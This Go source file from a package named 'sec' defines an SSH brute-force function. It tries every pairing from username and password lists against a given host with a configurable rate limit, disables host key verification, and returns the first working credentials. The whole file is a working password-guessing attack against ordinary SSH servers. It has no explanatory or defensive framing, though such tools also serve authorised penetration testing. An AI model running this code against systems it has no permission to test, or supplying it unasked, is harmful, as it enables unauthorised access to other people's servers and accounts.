package sec

import (
	"errors"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var ErrCredsNotFound = errors.New("valid credentials not found")

func SshBruteforce(host, port string, usernames, passwords *[]string, timeout time.Duration, rpm int) (correctUser, correctPass string, err error) {
	sleepAmount := GetSleep(rpm)

	cracked := false
	for _, username := range *usernames {
		if cracked {
			break
		}
		for _, password := range *passwords {
			if cracked {
				break
			}
			RateLimitedAction(sleepAmount, func() {
				_, err := ssh.Dial("tcp", net.JoinHostPort(host, port), &ssh.ClientConfig{
					User:            username,
					Auth:            []ssh.AuthMethod{ssh.Password(password)},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
					Timeout:         timeout,
				})
				if err != nil {
					return
				}
				correctUser = username
				correctPass = password
				cracked = true
			})
		}
	}

	if correctUser == "" && correctPass == "" {
		err = ErrCredsNotFound
	}

	return correctUser, correctPass, err
}
